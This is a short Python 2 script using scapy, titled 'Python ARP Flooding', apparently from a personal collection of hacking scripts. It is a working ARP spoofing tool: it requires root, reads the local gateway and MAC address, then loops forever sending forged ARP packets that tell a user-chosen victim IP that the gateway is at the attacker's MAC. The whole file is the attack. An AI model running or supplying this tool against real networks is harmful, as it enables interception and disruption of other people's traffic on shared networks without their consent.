"""
Name             : Python ARP Flooding
Created By       : Agus Makmun (Summon Agus)
Blog             : bloggersmart.net - python.web.id
License          : GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007
Documentation    : https://github.com/agusmakmun/Some-Examples-of-Simple-Python-Script/
Thanks to        : RR12 - Indonesian Backtrack Team
"""

from scapy.all import *
import sys, os, re, commands, time

def _checkRoot():
    if os.getuid() != 0:
        print "[-] Please Access as root..!"
        sys.exit()
    else:
        pass
    
def _arpFlood(iface, target):
    conf.iface = iface
    target = target
    pkt = ARP()

    gateway = commands.getoutput("ip route list | grep default").split()[2][0:]
    pkt.psrc = gateway

    pkt.pdst = target

    mac_address = commands.getoutput("ifconfig " + iface).split()[4][0:]
    pkt.hwsrc = mac_address
    
    time.sleep(2)
    print ""
    print "[+] Interface\t\t : %s" % iface
    print "[+] Your Mac Address\t : %s" % mac_address
    print "[+] Gateway\t\t : %s" % gateway
    print "[+] Victim IP Address to : %s" % target
    print "\n[-] CTRL+C to Exit"
    try:
        while 1:
            send(pkt, verbose=0)
            time.sleep(0.5)
    except:
        print '\n[-] Process Stopped'
        
if __name__ == '__main__':
    os.system("clear")
    _checkRoot()    
    iface = raw_input("\n[+] Type interface (ex: wlan0): ")
    target = raw_input("[+] Type ip target (ex, ip server: 192.168.1.1): ")
    try:
        _arpFlood(iface, target)
    except KeyboardInterrupt:
        print "\n[+] Thank you.."
